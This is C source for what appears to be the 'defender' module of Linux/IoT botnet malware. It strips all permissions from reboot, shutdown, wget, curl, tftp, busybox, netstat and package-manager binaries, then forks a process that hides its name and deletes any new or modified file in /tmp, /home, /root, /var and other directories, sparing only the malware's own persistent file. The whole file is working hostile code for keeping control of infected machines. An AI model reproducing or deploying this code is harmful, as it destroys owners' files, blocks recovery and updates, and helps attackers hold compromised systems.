#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>

#include <sys/prctl.h>

#include "includes.h"
#include "defender.h"
#include "util.h"

#define MAX_PATH_LENGTH 256
#include "rand.h"
#include "stealth.h"
#include "persistence.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

static const char *lockdown_commands[] = {
    "/sbin/reboot",       "/usr/sbin/reboot",  "/bin/reboot",
    "/usr/bin/reboot",    "/sbin/shutdown",    "/usr/sbin/shutdown",
    "/bin/shutdown",      "/usr/bin/shutdown", "/sbin/poweroff",
    "/usr/sbin/poweroff", "/bin/poweroff",     "/usr/bin/poweroff",
    "/sbin/halt",         "/usr/sbin/halt",    "/bin/halt",
    "/usr/bin/halt",      "/sbin/wget",        "/usr/sbin/wget",
    "/bin/wget",          "/usr/bin/wget",     "/sbin/curl",
    "/usr/sbin/curl",     "/bin/curl",         "/usr/bin/curl",
    "/sbin/ftpget",       "/usr/sbin/ftpget",  "/bin/ftpget",
    "/usr/bin/ftpget",    "/sbin/tftp",        "/usr/sbin/tftp",
    "/bin/tftp",          "/usr/bin/tftp",     "/sbin/busybox",
    "/usr/sbin/busybox",  "/bin/busybox",      "/usr/bin/busybox",
    "/sbin/netstat",      "/usr/sbin/netstat", "/bin/netstat",
    "/usr/bin/netstat",   "/usr/bin/apt",      "/usr/bin/apt-get",
    "/usr/bin/yum",       "/usr/bin/dnf",      "/usr/bin/pccman",
    "/usr/bin/zypper",    "/usr/bin/apk"
};

static const char *watch_paths[] = {
    "/tmp",
    "/var/tmp",
    "/dev/shm",
    "/var/run",
    "/root",
    "/home",
    "/mnt",
    "/var"
};

static int inotify_fd = -1;
static int watcher_pid = -1;

void defender_lockdown_commands(void) {
    int num_cmds = sizeof(lockdown_commands) / sizeof(lockdown_commands[0]);
    for (int i = 0; i < num_cmds; i++) {
        
        if (chmod(lockdown_commands[i], 0000) == -1) {
            #ifdef DEBUG
            
            #endif
        }
    }
}

static void watcher_process(void) {
    char buffer[EVENT_BUF_LEN];
    int wds[32]; 
    int num_watches = 0;

    inotify_fd = inotify_init();
    if (inotify_fd < 0) return;

    for (int i = 0; i < sizeof(watch_paths) / sizeof(watch_paths[0]); i++) {
        int wd = inotify_add_watch(inotify_fd, watch_paths[i], IN_CREATE | IN_MODIFY);
        if (wd != -1) {
            wds[num_watches++] = wd;
        }
    }

    #ifdef DEBUG
    printf("[defender] Watching %d directories\n", num_watches);
    #endif

    while (1) {
        int length = read(inotify_fd, buffer, EVENT_BUF_LEN);
        if (length < 0) break;

        int i = 0;
        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            if (!(event->mask & IN_ISDIR) && event->len > 0) {
                
                const char *base_path = NULL;
                for (int j = 0; j < num_watches; j++) {
                    if (event->wd == wds[j]) {
                        base_path = watch_paths[j];
                        break;
                    }
                }

                if (base_path != NULL) {
                    char full_path[MAX_PATH_LENGTH];
                    snprintf(full_path, sizeof(full_path), "%s/%s", base_path, event->name);

                    
                    const char *persist_path = get_persistent_path();
                    if (persist_path == NULL || strstr(full_path, persist_path) == NULL) {
                        #ifdef DEBUG
                        printf("[defender] Deleting suspicious file: %s\n", full_path);
                        #endif
                        unlink(full_path);
                    }
                }
            }
            i += EVENT_SIZE + event->len;
        }
        usleep(100000); 
    }

    close(inotify_fd);
}

void defender_start_watcher(void) {
    watcher_pid = fork();
    if (watcher_pid == 0) {
        
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        
        
        stealth_hide_process_name();
        
        watcher_process();
        exit(0);
    }
}

void defender_stop_watcher(void) {
    if (watcher_pid != -1) {
        kill(watcher_pid, SIGKILL);
        watcher_pid = -1;
    }
}

void defender_init(void) {
    
    defender_lockdown_commands();
    
    
    defender_start_watcher();
}
